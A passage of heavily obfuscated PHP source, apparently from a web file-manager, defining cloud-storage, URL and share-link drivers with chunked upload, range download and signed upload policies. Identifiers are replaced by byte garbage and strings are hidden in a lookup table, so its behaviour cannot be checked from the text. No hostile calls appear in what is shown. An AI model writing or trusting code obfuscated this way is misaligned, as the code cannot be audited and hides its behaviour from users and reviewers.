$Š»ş×ÓÁ[12]; $ÒÈÁµ¸„ = 500; $—½©Âêû = 0; $¢¹àİ’á = 0; $‹° ƒ•² = rtrim($ë†â–ÔÜ, $Š»ş×ÓÁ[8]) . $Š»ş×ÓÁ[8]; while (!0) { check_abort(); $ îÎ¾’§ = $this->listObjs($ë†â–ÔÜ, $á•ºÓÑî, $ÒÈÁµ¸„); if (!$ îÎ¾’§) { return !1; } $á•ºÓÑî = isset($ îÎ¾’§[$Š»ş×ÓÁ[1775]]) ? $ îÎ¾’§[$Š»ş×ÓÁ[1775]] : $Š»ş×ÓÁ[12]; $Ú˜œí¨Õ = isset($ îÎ¾’§[$Š»ş×ÓÁ[1776]]) ? $ îÎ¾’§[$Š»ş×ÓÁ[1776]] : array(); if (empty($Ú˜œí¨Õ)) { break; } $»ó£Áíİ = array_filter($Ú˜œí¨Õ, function ($ ¾®¤‚û) { $íÇ†ø© =& $_SERVER[œ—üé‹ê]; return $ ¾®¤‚û[$íÇ†ø©[33]] == $íÇ†ø©[78]; }); $“¹ŞÏâÖ = count($Ú˜œí¨Õ); $»ó£Áíİ = count($»ó£Áíİ); $†¸ËÇºÈ = $“¹ŞÏâÖ - $»ó£Áíİ; if ($‘öûÒ°) { $¢¹àİ’á += $»ó£Áíİ; $—½©Âêû += $†¸ËÇºÈ; if ($“¹ŞÏâÖ < $ÒÈÁµ¸„) { break; } continue; } if ($³Éš¡¢œ) { if ($†¸ËÇºÈ) { return !0; } } else { if ($»ó£Áíİ) { return !0; } } if ($“¹ŞÏâÖ < $ÒÈÁµ¸„) { break; } } if ($‘öûÒ°) { return array($Š»ş×ÓÁ[239] => $—½©Âêû, $Š»ş×ÓÁ[240] => $¢¹àİ’á); } return !1; } public function listAll($¶Ğá¿å) { $ÚºÇõ°Ä =& $_SERVER[œ—üé‹ê]; $Û¡š œ¨ = $‚ƒÖÒĞˆ = array(); $this->fileList($¶Ğá¿å, $Û¡š œ¨, $‚ƒÖÒĞˆ, !0); $¾¯——–Œ = array_to_keyvalue($‚ƒÖÒĞˆ, $ÚºÇõ°Ä[32]); foreach ($Û¡š œ¨ as $Ò‘»ƒâø) { if (is_string($Ò‘»ƒâø)) { $¾¯——–Œ[$Ò‘»ƒâø] = array($ÚºÇõ°Ä[79] => 0); } } return $this->listAllFiles($¶Ğá¿å, $¾¯——–Œ); } public function canRead($ÀªéçÔ) { return $this->exist($ÀªéçÔ) ? !0 : !1; } public function canWrite($š„ıè¿„) { return $this->exist($š„ıè¿„) ? !0 : !1; } public function getContent($Ş»ï•ÅÁ) { return $this->fileSubstr($Ş»ï•ÅÁ, 0, -1); } public function setContent($¥Ë»êÅ÷, $‰€‰¦æø = '') { $³ÉÊ”†‚ =& $_SERVER[œ—üé‹ê]; if (!$‰€‰¦æø) { $ü¯­á‡ = $this->ussRequest($¥Ë»êÅ÷, $³ÉÊ”†‚[288]); return $ü¯­á‡[$³ÉÊ”†‚[1398]]; } $ äî¶¿ = $this->tempFile($this->pathThis($¥Ë»êÅ÷)); file_put_contents($ äî¶¿, $‰€‰¦æø); if ($this->upload($¥Ë»êÅ÷, $ äî¶¿)) { $this->tempFileRemve($ äî¶¿); return !0; } return !1; } public function fileSubstr($’¥­™¼, $”ºƒ€›Ö, $€¿˜‹šƒ) { $Ô‹¡¦Ì… =& $_SERVER[œ—üé‹ê]; if (!($•ÎÆ = $this->link($’¥­™¼))) { return !1; } $İÉÀ®¬Ú = !1; if ($€¿˜‹šƒ > 0) { $’¶÷¾æ = $”ºƒ€›Ö + $€¿˜‹šƒ - 1; $İÉÀ®¬Ú = array($Ô‹¡¦Ì…[1601] . $”ºƒ€›Ö . $Ô‹¡¦Ì…[476] . $’¶÷¾æ); } $¤Æœ °ò = url_request($•ÎÆ, $Ô‹¡¦Ì…[1602], !1, $İÉÀ®¬Ú); return $¤Æœ °ò[$Ô‹¡¦Ì…[859]] ? $¤Æœ °ò[$Ô‹¡¦Ì…[1388]] : !1; } public function upload($ˆçëòîü, $’‹‚ßŞä, $ßÀô­É = false, $ÇƒİˆŒ· = REPEAT_REPLACE) { $éÒı×š =& $_SERVER[œ—üé‹ê]; if (!$’‹‚ßŞä || !@file_exists($’‹‚ßŞä)) { return !1; } $é¾â¸š¯ = IO::size($’‹‚ßŞä); if ($é¾â¸š¯ <= 1024 * 1024 * 200) { $ªØ†Ì…× = array($éÒı×š[1778] . $’‹‚ßŞä); $š­Åì¶ = $this->ussRequest($ˆçëòîü, $éÒı×š[253], $ªØ†Ì…×); return $š­Åì¶[$éÒı×š[1398]] ? $this->getPathOuter($ˆçëòîü) : !1; } $üÔšÁï = 1024 * 1024 * 10; $ÎŒ¦…ÏÆ = array($éÒı×š[1779], $éÒı×š[1780] . $é¾â¸š¯, $éÒı×š[1781], $éÒı×š[1782] . $üÔšÁï); $š­Åì¶ = $this->ussRequest($ˆçëòîü, $éÒı×š[253], !1, $ÎŒ¦…ÏÆ); if (!$š­Åì¶[$éÒı×š[1398]]) { return !1; } $¦áò¹å = $š­Åì¶[$éÒı×š[1388]]; $®‰„‹” = 0; $ÖÙó½ = $¦áò¹å[$éÒı×š[1783]]; $†Å’Ë¡² = fopen($’‹‚ßŞä, $éÒı×š[1663]); if (!$†Å’Ë¡²) { return !1; } do { $ÀÈÓ”õŒ = $¦áò¹å[$éÒı×š[1784]]; fseek_64($†Å’Ë¡², $®‰„‹”); $ÎÉĞ–¥ = fread($†Å’Ë¡², $ÀÈÓ”õŒ); $ø§·¥ò³ = 0; do { $ø§·¥ò³++; $¦áò¹å = $this->uploadPart($ˆçëòîü, $¦áò¹å, $ÎÉĞ–¥); } while (!$¦áò¹å && $ø§·¥ò³ < 3); if (!$¦áò¹å) { return !1; } $ÖÙó½ = $¦áò¹å[$éÒı×š[1783]]; $®‰„‹” += $ÀÈÓ”õŒ; } while ($ÖÙó½ != -1); fclose($†Å’Ë¡²); $ÎŒ¦…ÏÆ = array($éÒı×š[1785], $éÒı×š[1786] . $¦áò¹å[$éÒı×š[1787]], $éÒı×š[1781]); $š­Åì¶ = $this->ussRequest($ˆçëòîü, $éÒı×š[253], !1, $ÎŒ¦…ÏÆ); return $š­Åì¶[$éÒı×š[1398]] ? $this->getPathOuter($Î§ªÓ¢˜) : !1; } private function uploadPart($²¡±É‚š, $áªïÄ¥», &$Ûç‡ûŸ£) { $õ•—´¡Õ =& $_SERVER[œ—üé‹ê]; $·ã˜¬‰ = array($õ•—´¡Õ[1788], $õ•—´¡Õ[1786] . $áªïÄ¥»[$õ•—´¡Õ[1787]], $õ•—´¡Õ[1789] . $áªïÄ¥»[$õ•—´¡Õ[1783]], $õ•—´¡Õ[143] . $áªïÄ¥»[$õ•—´¡Õ[1784]]); $İ™‚ş = $this->ussRequest($²¡±É‚š, $õ•—´¡Õ[253], $Ûç‡ûŸ£, $·ã˜¬‰); return !$İ™‚ş[$õ•—´¡Õ[1398]] ? $İ™‚ş[$õ•—´¡Õ[1398]] : $İ™‚ş[$õ•—´¡Õ[1388]]; } public function uploadFormData($•®Óğ¾, $ ¼““Ò = 3600) { return $this->uploadPolicy($•®Óğ¾, $ ¼““Ò); } public function uploadMultiData($€ÜôÉßù, $•øÜ€ÕÏ = 3600) { $òæÛ¤² =& $_SERVER[œ—üé‹ê]; $Íü•…ĞÃ = (int) $GLOBALS[$òæÛ¤²[7]][$òæÛ¤²[79]]; return $this->uploadPolicy($€ÜôÉßù, $•øÜ€ÕÏ, $Íü•…ĞÃ); } private function uploadPolicy($ğ‘üÑœ, $³‘İÇ£ = 3600, $Æªˆ„¾ø = 0) { $Ÿ¯°Òµ =& $_SERVER[œ—üé‹ê]; $ûÑÜ­¿ã = $Ÿ¯°Òµ[8] . $this->bucket; $Ë¤îÙ¾Ò = gmdate($Ÿ¯°Òµ[1698]); $Ï‹ì†âœ = array($Ÿ¯°Òµ[1790] => $this->bucket, $Ÿ¯°Òµ[1791] => $ğ‘üÑœ, $Ÿ¯°Òµ[1792] => time() + $³‘İÇ£, $Ÿ¯°Òµ[1793] => $Ë¤îÙ¾Ò); if ($Æªˆ„¾ø) { $Ï‹ì†âœ[$Ÿ¯°Òµ[1683]] = $Æªˆ„¾ø; } $é›Í¿³ = base64_encode(json_encode($Ï‹ì†âœ)); $ÏÙÁ¦öÄ = base64_encode(hash_hmac($Ÿ¯°Òµ[1747], "\x50\117\123\x54\x26{$ûÑÜ­¿ã}\46{$Ë¤îÙ¾Ò}\46{$é›Í¿³}", md5("{$this->userpass}"), !0)); $¬ëÍ‡¸¨ = array($Ÿ¯°Òµ[277] => $é›Í¿³, $Ÿ¯°Òµ[1794] => "\x55\x50\x59\x55\116\x20{$this->username}\72{$ÏÙÁ¦öÄ}", $Ÿ¯°Òµ[206] => $this->endpoint . $ûÑÜ­¿ã); return $¬ëÍ‡¸¨; } public function download($Í°ÅÎ¸, $ğÛ¡Ö—) { $«Íü¿­¯ = IO::getPathInner(IO::mkfile($ğÛ¡Ö—)); if (!($óüµ‡ŠÂ = $this->link($Í°ÅÎ¸))) { return !1; } $ÃÆúÏÜ³ = 0; $¯çò± œ = 1024 * 200; $Çóã†ÛÃ = fopen($«Íü¿­¯, $_SERVER[œ—üé‹ê][1742]); while (!0) { $ş¸œŸå— = $this->fileSubstr($Í°ÅÎ¸, $ÃÆúÏÜ³, $¯çò± œ); if ($ş¸œŸå— === !1) { return !1; } fwrite($Çóã†ÛÃ, $ş¸œŸå—); $ÃÆúÏÜ³ += $¯çò± œ; if (strlen($ş¸œŸå—) < $¯çò± œ) { break; } } fclose($Çóã†ÛÃ); return $ğÛ¡Ö—; } public function link($ÆŸèÙß‡, $Ë¯îœÔÕ = array()) { $°ö‘Ê·Œ =& $_SERVER[œ—üé‹ê]; $ÆŸèÙß‡ = trim($ÆŸèÙß‡, $°ö‘Ê·Œ[8]); if (!empty($this->token)) { $ˆøãÙ‡ = strtotime(date($°ö‘Ê·Œ[1795])); $»™ˆÜ = substr(md5($this->token . $°ö‘Ê·Œ[284] . $ˆøãÙ‡ . $°ö‘Ê·Œ[1796] . $ÆŸèÙß‡), 12, 8) . $ˆøãÙ‡; $Ë¯îœÔÕ[] = $°ö‘Ê·Œ[1797] . $»™ˆÜ; } $Óßõ¼ÌŒ = !empty($Ë¯îœÔÕ) ? $°ö‘Ê·Œ[76] . implode($°ö‘Ê·Œ[284], $Ë¯îœÔÕ) : $°ö‘Ê·Œ[12]; return $this->getHost() . $°ö‘Ê·Œ[8] . $this->pathEncode($ÆŸèÙß‡) . $Óßõ¼ÌŒ; } public function fileOut($‚ê¢Ù‡ê, $ÅØüãÚ± = false, $Â”‰ƒÜØ = false, $®Ó¶ÁŠ† = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($‚ê¢Ù‡ê, $ÅØüãÚ±, $Â”‰ƒÜØ, $®Ó¶ÁŠ†); } if (!$Â”‰ƒÜØ) { $Â”‰ƒÜØ = $this->pathThis($‚ê¢Ù‡ê); } $ƒ°«×©Ã = $ÅØüãÚ± ? array($_SERVER[œ—üé‹ê][1798] . rawurlencode($Â”‰ƒÜØ)) : array(); $Çƒ„µÄ = $this->link($‚ê¢Ù‡ê, $ƒ°«×©Ã); $this->fileOutLink($Çƒ„µÄ); } public function fileOutServer($ÖİŸÎä´, $¢ ğìÕ’ = false, $êğ´Ğ·Ï = false, $±—Ñ×÷Ø = '') { parent::fileOut($ÖİŸÎä´, $¢ ğìÕ’, $êğ´Ğ·Ï, $±—Ñ×÷Ø); } public function fileOutImage($¢’İ£ˆ, $‹ÃÑÄã = 250) { $ô¡ ¢‘ = $this->link($¢’İ£ˆ . $_SERVER[œ—üé‹ê][1799] . $‹ÃÑÄã); $this->fileOutLink($ô¡ ¢‘); } public function fileOutImageServer($§Éü­ÑÌ, $­íÓ¶Æ´ = 250) { parent::fileOutImage($§Éü­ÑÌ, $­íÓ¶Æ´); } public function hashMd5($ëïÄë«“) { $ş›Ú—ùî =& $_SERVER[œ—üé‹ê]; $°é§‘¯ = $this->_objectMeta($ëïÄë«“); return isset($°é§‘¯[$ş›Ú—ùî[245]]) ? $°é§‘¯[$ş›Ú—ùî[245]] : !1; } public function size($±ˆü’¶«) { $ã¹‹«¶¤ = $this->objectMeta($±ˆü’¶«); return $ã¹‹«¶¤ ? $ã¹‹«¶¤[$_SERVER[œ—üé‹ê][79]] : 0; } public function info($…é¡¨Ù) { if ($this->isFolder($…é¡¨Ù)) { return $this->folderInfo($…é¡¨Ù); } else { if ($this->isFile($…é¡¨Ù)) { return $this->fileInfo($…é¡¨Ù); } } return !1; } public function exist($õ÷éõé) { return $this->isFile($õ÷éõé) || $this->isFolder($õ÷éõé); } public function isFile($ÃÍÆ®À) { return !$this->isFolder($ÃÍÆ®À) && $this->objectMeta($ÃÍÆ®À); } public function isFolder($ËËñÁı) { return $this->cacheMethod($_SERVER[œ—üé‹ê][177], $ËËñÁı); } protected function objectMeta($º­®‚Ãú) { return $this->cacheMethod($_SERVER[œ—üé‹ê][179], $º­®‚Ãú); } protected function _objectMeta($ªÜ†¿Œ„) { $¸ÕúâÜ‘ =& $_SERVER[œ—üé‹ê]; if ($ªÜ†¿Œ„ == $¸ÕúâÜ‘[12] || $ªÜ†¿Œ„ == $¸ÕúâÜ‘[8]) { return array(); } $×Ú¬ÒşŸ = $this->ussRequest($ªÜ†¿Œ„, $¸ÕúâÜ‘[1800]); if (!$×Ú¬ÒşŸ[$¸ÕúâÜ‘[1398]]) { return null; } $š‹³óÁ = isset($×Ú¬ÒşŸ[$¸ÕúâÜ‘[1388]]) ? $×Ú¬ÒşŸ[$¸ÕúâÜ‘[1388]] : array(); if (!isset($š‹³óÁ[$¸ÕúâÜ‘[1801]])) { return null; } $˜ûÎô³ã = array($¸ÕúâÜ‘[33] => isset($š‹³óÁ[$¸ÕúâÜ‘[1801]]) ? $š‹³óÁ[$¸ÕúâÜ‘[1801]] : null, $¸ÕúâÜ‘[79] => isset($š‹³óÁ[$¸ÕúâÜ‘[1802]]) ? $š‹³óÁ[$¸ÕúâÜ‘[1802]] : null, $¸ÕúâÜ‘[245] => isset($š‹³óÁ[$¸ÕúâÜ‘[1803]]) ? $š‹³óÁ[$¸ÕúâÜ‘[1803]] : null, $¸ÕúâÜ‘[1770] => isset($š‹³óÁ[$¸ÕúâÜ‘[1804]]) ? $š‹³óÁ[$¸ÕúâÜ‘[1804]] : null); $˜ûÎô³ã[$¸ÕúâÜ‘[1771]] = isset($š‹³óÁ[$¸ÕúâÜ‘[1805]]) ? strtotime($š‹³óÁ[$¸ÕúâÜ‘[1805]]) : $˜ûÎô³ã[$¸ÕúâÜ‘[1770]]; return $˜ûÎô³ã; } protected function _isFolder($ßµ„¸Ô­) { $ìÄ‰úª­ =& $_SERVER[œ—üé‹ê]; if ($ßµ„¸Ô­ == $ìÄ‰úª­[12] || $ßµ„¸Ô­ == $ìÄ‰úª­[8]) { return !0; } $£§ÛÎÁ = $this->_objectMeta($ßµ„¸Ô­); return isset($£§ÛÎÁ[$ìÄ‰úª­[33]]) && $£§ÛÎÁ[$ìÄ‰úª­[33]] == $ìÄ‰úª­[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($şÅÅ×ˆÂ = false) { } public function exist($™Ï©»Ê–) { $›¯»ú–È = $this->info($™Ï©»Ê–); return $›¯»ú–È[$_SERVER[œ—üé‹ê][232]]; } public function isFile($îÒæÜÑó) { $ßäËúô  = $this->info($îÒæÜÑó); return $ßäËúô [$_SERVER[œ—üé‹ê][232]]; } public function isFolder($¢°¶ö«ğ) { return !1; } public function size($ŒæŸº°) { $µ–¦Ê“’ = $this->info($ŒæŸº°); return $µ–¦Ê“’[$_SERVER[œ—üé‹ê][79]]; } public function info($—ÊÓ«ó) { return $this->infoParse($—ÊÓ«ó); } public function infoAuth($€ô¾­Á„) { return $this->infoParse($€ô¾­Á„); } public function infoWithChildren($¶Õ†‹Ø) { return $this->infoParse($¶Õ†‹Ø); } public function infoFull($×Ó×Ü¯¿) { return $this->infoParse($×Ó×Ü¯¿); } private function infoParse($´™·µ³Ş) { $íÚ‘ûŒû =& $_SERVER[œ—üé‹ê]; $ôõ°òƒ = $this->header($´™·µ³Ş); if (!$ôõ°òƒ || !$ôõ°òƒ[$íÚ‘ûŒû[859]]) { return !1; } $œ–íÚ¨ƒ = _get($ôõ°òƒ, $íÚ‘ûŒû[412], 0); $ÈĞñ¢Ëõ = array($íÚ‘ûŒû[32] => $ôõ°òƒ[$íÚ‘ûŒû[32]], $íÚ‘ûŒû[87] => $´™·µ³Ş, $íÚ‘ûŒû[33] => $íÚ‘ûŒû[230], $íÚ‘ûŒû[79] => intval($œ–íÚ¨ƒ), $íÚ‘ûŒû[166] => get_path_ext($ôõ°òƒ[$íÚ‘ûŒû[32]]), $íÚ‘ûŒû[1660] => $œ–íÚ¨ƒ > 0 && $ôõ°òƒ[$íÚ‘ûŒû[1806]], $íÚ‘ûŒû[1661] => !1); return $ÈĞñ¢Ëõ; } private function header($Ò·ë‚“¼) { $¼ƒÔëšû =& $_SERVER[œ—üé‹ê]; if (isset(self::$_cacheHeader[$Ò·ë‚“¼])) { return self::$_cacheHeader[$Ò·ë‚“¼]; } $¦ñ¿Ş’¦ = isset($GLOBALS[$¼ƒÔëšû[1807]]) ? $GLOBALS[$¼ƒÔëšû[1807]] : !1; $GLOBALS[$¼ƒÔëšû[1807]] = !0; self::$_cacheHeader[$Ò·ë‚“¼] = url_header($Ò·ë‚“¼); $GLOBALS[$¼ƒÔëšû[1807]] = $¦ñ¿Ş’¦; return self::$_cacheHeader[$Ò·ë‚“¼]; } public function hashSimple($âı€ŸÍ×, $œèæ”îº = false) { $Ü¦Ğáú‘ =& $_SERVER[œ—üé‹ê]; $µº¥ùéÜ = $this->info($âı€ŸÍ×); if (!$µº¥ùéÜ || !$µº¥ùéÜ[$Ü¦Ğáú‘[232]]) { return !1; } $á–´İùÓ = $µº¥ùéÜ[$Ü¦Ğáú‘[79]]; $½ ãúÓ¡ = 200; $¡½Ğ‰Øí = 50; if ($á–´İùÓ <= $½ ãúÓ¡ * $¡½Ğ‰Øí) { return md5($this->fileSubstr($âı€ŸÍ×, 0, $á–´İùÓ)) . $á–´İùÓ; } $„¨öè» = intval($á–´İùÓ / $¡½Ğ‰Øí); $ëÕà Æà = $Ü¦Ğáú‘[12]; $˜êé’ú§ = timeFloat(); $ğ÷äçšá = 15; for ($ŒÕßÃû¡ = 0; $ŒÕßÃû¡ < $¡½Ğ‰Øí; $ŒÕßÃû¡++) { if (timeFloat() - $˜êé’ú§ > $ğ÷äçšá) { return !1; } $Ê€¸îÔ¯ = $this->fileSubstr($âı€ŸÍ×, $„¨öè» * $ŒÕßÃû¡, $½ ãúÓ¡); if (!$Ê€¸îÔ¯) { return !1; } $ëÕà Æà .= $Ê€¸îÔ¯; } $ëÕà Æà .= $this->fileSubstr($âı€ŸÍ×, $á–´İùÓ - $½ ãúÓ¡, $½ ãúÓ¡); return md5($ëÕà Æà) . $á–´İùÓ; } public function getContent($ú äîç) { return $this->fileSubstr($ú äîç); } public function fileSubstr($€ºñùäØ, $ˆ›ÉÃ£ø = 0, $ó¯Ù²’í = -1) { $²é‰¥ó² =& $_SERVER[œ—üé‹ê]; $îÀ™öî = $this->info($€ºñùäØ); if (!$îÀ™öî || !$îÀ™öî[$²é‰¥ó²[232]] && $îÀ™öî[$²é‰¥ó²[79]] > 1024 * 1024 * 10) { return !1; } if ($ó¯Ù²’í === -1) { $ó¯Ù²’í = $îÀ™öî[$²é‰¥ó²[79]]; } if ($ó¯Ù²’í == 0) { return $²é‰¥ó²[12]; } $™±Òã“õ = array($²é‰¥ó²[1808] . $ˆ›ÉÃ£ø . $²é‰¥ó²[897] . ($ˆ›ÉÃ£ø + $ó¯Ù²’í - 1)); $÷èïçÚÎ = url_request($€ºñùäØ, $²é‰¥ó²[1602], !1, $™±Òã“õ, !1, !1, 30); return $÷èïçÚÎ[$²é‰¥ó²[1388]] ? $÷èïçÚÎ[$²é‰¥ó²[1388]] : $²é‰¥ó²[12]; } public function download($ È…ß´, $»Ø†ÔõÂ) { Downloader::start($ È…ß´, $»Ø†ÔõÂ); return $»Ø†ÔõÂ; } } goto c“³ÀòÈ×à; FëáŸŞ‡õŠ: class PathDriverDriverShareItem { public function __construct($ôíäîÀƒ) { $this->pathParse = $ôíäîÀƒ; } public function __call($òœ³öŒó, $¢Òã‘Ùæ) { $Û¹øœÂ =& $_SERVER[œ—üé‹ê]; if (method_exists($this, $òœ³öŒó)) { return; } $ß»¥÷Ç³ = call_user_func_array(array($Û¹øœÂ[1538], $òœ³öŒó), $¢Òã‘Ùæ); $ÙŞİ°Ó = array($Û¹øœÂ[1539], $Û¹øœÂ[1540], $Û¹øœÂ[1541], $Û¹øœÂ[1542], $Û¹øœÂ[641], $Û¹øœÂ[643], $Û¹øœÂ[1543], $Û¹øœÂ[107], $Û¹øœÂ[1544], $Û¹øœÂ[1545]); if (in_array($òœ³öŒó, $ÙŞİ°Ó)) { $ß»¥÷Ç³ = $this->getPathOuter($ß»¥÷Ç³); } return $ß»¥÷Ç³; } public function copy($í¾Œ¬¦, $‹õŞ—Ôƒ, $Òˆª‘Äå = false, $À¡´ñ¡â = false) { return $this->copyMove($í¾Œ¬¦, $‹õŞ—Ôƒ, $Òˆª‘Äå, $_SERVER[œ—üé‹ê][641], $À¡´ñ¡â); } public function move($Ë±Ï–ªÛ, $†Ó¼ƒ÷, $Ñõ†Ù˜ş = false, $ßÍåüÚ‘ = false) { return $this->copyMove($Ë±Ï–ªÛ, $†Ó¼ƒ÷, $Ñõ†Ù˜ş, $_SERVER[œ—üé‹ê][643], $ßÍåüÚ‘); } private function copyMove($¾å±Ï„, $Àò¯Ö½¼, $Ñ•¼ºşç, $úº•ıÑÓ, $¤³şÈåˆ = false) { $ŸÒè¨Û‹ =& $_SERVER[œ—üé‹ê]; $Ùø•½Á = $Àò¯Ö½¼; $À§±«¨Ÿ = IO::driverMake($Àò¯Ö½¼); if ($À§±«¨Ÿ->pathParse[$ŸÒè¨Û‹[1333]]) { $Àò¯Ö½¼ = $À§±«¨Ÿ->pathParse[$ŸÒè¨Û‹[1333]]; } else { $Àò¯Ö½¼ = $Ùø•½Á; } $¾ĞÅ–ƒè = IO::copyMove($¾å±Ï„, $Àò¯Ö½¼, $Ñ•¼ºşç, $úº•ıÑÓ, $¤³şÈåˆ); $¾ĞÅ–ƒè = $this->getPathOuter($¾ĞÅ–ƒè); return $¾ĞÅ–ƒè; } public function pathThis($ò…–Ã½Ã) { return get_path_this($this->pathParse[$_SERVER[œ—üé‹ê][87]]); } public function pathFather($Ö™‡‡—¸) { return get_path_father($this->pathParse[$_SERVER[œ—üé‹ê][87]]); } public function iconvSystem($Úõ÷Şô‚) { return $Úõ÷Şô‚; } protected function infoParse($ßææĞ˜Î, $àìÛÍè = false) { $‰âğÖí =& $_SERVER[œ—üé‹ê]; $…êõ¾‰¹ = $this->pathParse[$‰âğÖí[576]][$‰âğÖí[583]] . $this->pathParse[$‰âğÖí[1352]]; if ($àìÛÍè) { $ÔàÇû  = IO::infoWithChildren($…êõ¾‰¹); } else { $ÔàÇû  = IO::info($…êõ¾‰¹); } $åœë¯Ê™ = $this->pathParse[$‰âğÖí[576]]; return Action($‰âğÖí[1537])->_shareItemeParse($ÔàÇû , $åœë¯Ê™); } public function listAll($Š¥•ìœî) { $«Æœöè =& $_SERVER[œ—üé‹ê]; $ß ß‰™Ö = IO::listAll($Š¥•ìœî); $©‡£ï‚– = rtrim($this->pathParse[$«Æœöè[576]][$«Æœöè[583]], $«Æœöè[8]); foreach ($ß ß‰™Ö as &$ğ„´Ë¡ˆ) { $ğ„´Ë¡ˆ[$«Æœöè[87]] = $this->pathDriver . $«Æœöè[8] . ltrim(substr($ğ„´Ë¡ˆ[$«Æœöè[87]], strlen($©‡£ï‚–)), $«Æœöè[8]); } unset($ğ„´Ë¡ˆ); return $ß ß‰™Ö; } public function listAllSimple($”ĞÆŞ‚‰, $±Ãö¬øÅ = false) { $ô«—ıœ =& $_SERVER[œ—üé‹ê]; $‰ô­»‹ = $this->listAll($”ĞÆŞ‚‰); $¡æĞµ”¦ = $this->pathParse[$ô«—ıœ[510]]; if (trim($¡æĞµ”¦, $ô«—ıœ[8]) == trim(get_path_father($¡æĞµ”¦), $ô«—ıœ[8])) { $±Ãö¬øÅ = !0; } return IO::init($ô«—ıœ[12])->listAllSimpleMake($‰ô­»‹, $¡æĞµ”¦, $±Ãö¬øÅ); } public function getPathOuter($äé«ô—˜) { $ ÷•ÊĞÚ =& $_SERVER[œ—üé‹ê]; $øÔûêäö = KodIO::parse($äé«ô—˜); if ($øÔûêäö[$ ÷•ÊĞÚ[33]] == KodIO::KOD_SHARE_ITEM) { return $øÔûêäö[$ ÷•ÊĞÚ[87]]; } $¨áó¶Í = KodIO::clear($äé«ô—˜); $°šŒ·¥Ô = KodIO::clear($this->pathParse[$ ÷•ÊĞÚ[576]][$ ÷•ÊĞÚ[583]]); $ä¡ĞĞÇª = substr($¨áó¶Í, strlen($°šŒ·¥Ô)); if (substr($¨áó¶Í, 0, strlen($°šŒ·¥Ô)) != $°šŒ·¥Ô) { return !1; } return $this->pathParse[$ ÷•ÊĞÚ[1353]] . $ ÷•ÊĞÚ[8] . ltrim($ä¡ĞĞÇª, $ ÷•ÊĞÚ[8]); } public function getType() { $Äûú¡Ìü =& $_SERVER[œ—üé‹ê]; $µãú±œ© = str_replace($Äûú¡Ìü[77], $Äûú¡Ìü[12], get_class($this)); return strtolower($µãú±œ©); } public function isOsDriver($¬ƒª€ßö) { return IO::isOsDriver($¬ƒª€ßö); } public function info($½‚Ì©šş) { return $this->infoParse($½‚Ì©šş); } public function infoAuth($ØË–²) { return $this->infoParse($ØË–²); } public function infoWithChildren($±•áä¹) { return $this->infoParse($±•áä¹, !0); } public function infoFull($˜ÑÆş ë) { return $this->infoParse($˜ÑÆş ë); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ó¤µæ…) { $this->pathParse = $ó¤µæ…; } protected function infoParse($ªÛ³€ò£, $®ŞÖçÓ¨ = false) { $ù‚®›Ûµ =& $_SERVER[œ—üé‹ê]; return Action($ù‚®›Ûµ[1359])->sharePathInfo($this->pathParse[$ù‚®›Ûµ[87]], !0, $®ŞÖçÓ¨); } public function listPath($¦“çŒÙè, $÷óìÉÜõ = false) { $¢ô ğÍ =& $_SERVER[œ—üé‹ê]; $à¼íÜ² = IO::listPath($¦“çŒÙè, $÷óìÉÜõ); if (!$à¼íÜ²) { return $à¼íÜ²; } if (is_array($à¼íÜ²[$¢ô ğÍ[977]])) { $ ÁÇöÍÇ = Action($¢ô ğÍ[1546])->parsePathChildren($à¼íÜ²[$¢ô ğÍ[977]], array($¢ô ğÍ[510] => $¦“çŒÙè)); $à¼íÜ²[$¢ô ğÍ[977]] = Action($¢ô ğÍ[1359])->shareItemInfo($ ÁÇöÍÇ); } foreach ($à¼íÜ² as $µƒƒ™®Å => $É§âëÄú) { if (!in_array($µƒƒ™®Å, array($¢ô ğÍ[86], $¢ô ğÍ[85]))) { continue; } foreach ($É§âëÄú as $•ŒçÛõ => $ ÁÇöÍÇ) { $ ÁÇöÍÇ = Action($¢ô ğÍ[1546])->parsePathChildren($ ÁÇöÍÇ, array($¢ô ğÍ[510] => $¦“çŒÙè)); $à¼íÜ²[$µƒƒ™®Å][$•ŒçÛõ] = Action($¢ô ğÍ[1359])->shareItemInfo($ ÁÇöÍÇ); } } return $à¼íÜ²; } } class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($óç›´²¤) { $¤ñÔØ¸ä =& $_SERVER[œ—üé‹ê]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $óç›´²¤; $º¼Ì×”Ë = Model($¤ñÔØ¸ä[686])->getInfo($óç›´²¤[$¤ñÔØ¸ä[487]]); $ôÏûÆëÛ = _get($º¼Ì×”Ë, $¤ñÔØ¸ä[580]); $ğÌ¢Æšˆ = Model($¤ñÔØ¸ä[587])->authMake(_get($º¼Ì×”Ë, $¤ñÔØ¸ä[1547])); if (!$º¼Ì×”Ë) { IO::errorTips(LNG($¤ñÔØ¸ä[1548]), !1); } if (!$ğÌ¢Æšˆ) { IO::errorTips(LNG($¤ñÔØ¸ä[1549]), !1); } if ($ôÏûÆëÛ && is_string($ôÏûÆëÛ)) { $ôÏûÆëÛ = json_decode($ôÏûÆëÛ, !0); } if (!$ôÏûÆëÛ || !$ğÌ¢Æšˆ) { return; } $this->_config = array($¤ñÔØ¸ä[1353] => rtrim($óç›´²¤[$¤ñÔØ¸ä[1353]], $¤ñÔØ¸ä[8]) . $¤ñÔØ¸ä[8], $¤ñÔØ¸ä[1550] => $¤ñÔØ¸ä[1457] . $ôÏûÆëÛ[$¤ñÔØ¸ä[1551]] . $¤ñÔØ¸ä[499], $¤ñÔØ¸ä[576] => $º¼Ì×”Ë, $¤ñÔØ¸ä[580] => $ôÏûÆëÛ, $¤ñÔØ¸ä[1552] => $ğÌ¢Æšˆ, $¤ñÔØ¸ä[1553] => substr(APP_HOST, 0, 8) == $¤ñÔØ¸ä[217], $¤ñÔØ¸ä[1554] => Model($¤ñÔØ¸ä[591])->authCheck($ğÌ¢Æšˆ[$¤ñÔØ¸ä[503]], AuthModel::AUTH_VIEW, !1), $¤ñÔØ¸ä[1555] => Model($¤ñÔØ¸ä[591])->authCheck($ğÌ¢Æšˆ[$¤ñÔØ¸ä[503]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($¸ß¼ı‹Ò) { $ºÅÏË¤ =& $_SERVER[œ—üé‹ê]; $åÔÑä = $this->_config; if 